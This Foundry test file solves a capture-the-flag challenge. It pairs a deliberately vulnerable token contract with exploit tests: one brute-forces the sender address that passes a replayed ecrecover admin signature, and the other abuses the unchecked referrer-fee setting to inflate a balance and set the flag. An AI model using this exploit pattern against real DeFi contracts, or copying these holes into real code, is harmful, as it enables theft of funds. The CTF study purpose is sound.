// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";

// writeup: https://defihacklabs.substack.com/p/2023-numen-ctf-writeup-goatfinance

contract PrivilegeFinance {

	string public name = "Privilege Finance";
	string public symbol = "PF";
	uint256 public decimals = 18;
	uint256 public totalSupply = 200000000000;
    mapping(address => uint) public balances;
    mapping(address => address) public referrers;
    string msgsender = '0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0';
    uint public rewmax = 65000000000000000000000;
    uint public time = 1677729607;
    uint public Timeinterval = 600;
    uint public Timewithdraw = 6000;
    uint public Timeintervallimit = block.timestamp;
    uint public Timewithdrawlimit = block.timestamp;
    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
    uint8 v = 28;
    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;
    uint public burnFees = 2;
    uint public ReferrerFees = 8;
    uint public transferRate = 10;
    address public BurnAddr = 0x000000000000000000000000000000000000dEaD;
	bool public flag;

	constructor() public {
	    balances[address(this)] = totalSupply;
	}

    function Airdrop() public {
        require(balances[msg.sender] == 0 && block.timestamp >= Timeintervallimit,"Collection time not reached");
        balances[msg.sender] += 1000;
        balances[address(this)] -= 1000;
        Timeintervallimit += Timeinterval;
    }

    function deposit(address token, uint256 amount, address _ReferrerAddress) public {
        require(amount > 0, "amount zero!");
        if (msg.sender != address(0) && _ReferrerAddress != address(0) && msg.sender != _ReferrerAddress && referrers[msg.sender] == address(0)) {
            referrers[msg.sender] = _ReferrerAddress;
        }
        balances[msg.sender] -= amount;
        balances[address(this)] += amount;
    }

    function withdraw(address token, uint256 amount) public {
        require(balances[msg.sender] == 0 && block.timestamp >= Timewithdrawlimit,"Collection time not reached");
        require(amount > 0 && amount <= 2000,"Financial restrictions");
        Timewithdrawlimit += Timewithdraw;
        require(amount > 0, "amount zero!");
        balances[msg.sender] += amount;
        balances[address(this)] -= amount;
    }

    function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) {
        require(_blocktimestamp < 1677729610, "Time mismatch");
        require(_transferRate <= 50 && _transferRate <= 50);
        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));
        address a = ecrecover(_hash, v, r, s);
        require(a == admin && time < _blocktimestamp, "time or banker");
        ReferrerFees = _ReferrerFees;
        transferRate = _transferRate;
        return a;
    }

    function transfer(address recipient,uint256 amount) public {
        if(msg.sender == admin){
            uint256 _fee = amount * transferRate / 100;
            _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);
            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
            _transfer(address(this), recipient, amount * amount * transferRate);
            amount = amount - _fee;

        }else if(recipient == admin){
            uint256 _fee = amount * transferRate / 100;
            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
            amount = amount - _fee;
        }
        _transfer(msg.sender, recipient, amount);
    }

	function _transfer(address from, address _to, uint _value) internal returns (bool) {
	    balances[from] -= _value;
	    balances[_to] += _value;
	    return true;
	}

	function setflag() public {
	    if(balances[msg.sender] > 10000000){
			flag = true;
		}
	}

	function isSolved() public view returns(bool){
	    return flag;
    }

}

contract GoatFinanceTest is Test {
    uint rewmax = 65000000000000000000000;
    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
    uint8 v = 28;
    address admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;

    PrivilegeFinance internal _finance;
    uint256 internal constant _timestamp = 1677729609;
    address internal constant _sender = 0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053;
    address internal immutable _user = vm.addr(0x1);
    address internal immutable _referrer = vm.addr(0x2);

    function setUp() public virtual {
        _finance = new PrivilegeFinance();
    }

    function test_findSenderAndTimestamp() public {
        uint160 min = uint160(0x71Fa690CCcDC285e3CB6D5291eA935CFdFE4E000);
        uint160 max = uint160(0x71fA690cCcdC285e3cb6d5291ea935CfdfE4e0ff);

        // time (1677729607) < _blocktimestamp < 1677729610

        for (uint160 i = min; i <= max; i++) {
            address sender = address(i);
            uint256 timestampA = 1677729608;
            bytes32 _hashA = keccak256(abi.encodePacked(sender, rewmax, timestampA));
            address a = ecrecover(_hashA, v, r, s);

            if (a == admin) {
                emit log_named_address("sender", sender);
                emit log_named_uint("timestamp", timestampA);
                break;
            }

            uint256 timestampB = 1677729609;
            bytes32 _hashB = keccak256(abi.encodePacked(sender, rewmax, timestampB));
            address b = ecrecover(_hashB, v, r, s);

            if (b == admin) {
                emit log_named_address("sender", sender);
                emit log_named_uint("timestamp", timestampB);
                break;
            }
        }
    }

    function test_setflag_Solved() public {
        // total supply      : 200000000000
        // user balance      : 1000
        // finance balance   : 199999999000
        // referrer fees     : 10000000
        // transfer rate     : 50
        uint256 referrerFees = 10000000;
        uint256 transferRate = 50;

        vm.prank(_user);
        _finance.Airdrop();

        // update rates
        vm.prank(_user);
        _finance.DynamicRew(_sender, _timestamp, referrerFees, transferRate);

        // set referrer
        // user balance      : 900
        uint256 depositAmount = 100;
        vm.prank(_user);
        _finance.deposit(address(0x0), depositAmount, _referrer);

        // user transfer to admin, referrer will got sufficient balance to set flag
        // transfer amount   : 200
        // fee               : 100 (200 * 50 / 100)
        // burn fee          : 4   (100 * 2 / 50)
        // user balance      : 796 (900 - 100 - 4 = only spends 104)
        // referrer balance  : 20000000 (100 * 10000000 / 50)
        // admin balance     : 100 (200 - 100)
        uint256 transferAmount = 200;
         vm.prank(_user);
        _finance.transfer(admin, transferAmount);

        vm.prank(_referrer);
        _finance.setflag();

        assertTrue(_finance.isSolved(), "solved");
        assertEq(_finance.transferRate(), transferRate, "transfer rate");
        assertEq(_finance.ReferrerFees(), referrerFees, "referrer fees");
        assertEq(_finance.balances(_referrer), 20000000, "referrer balance");
    }
}
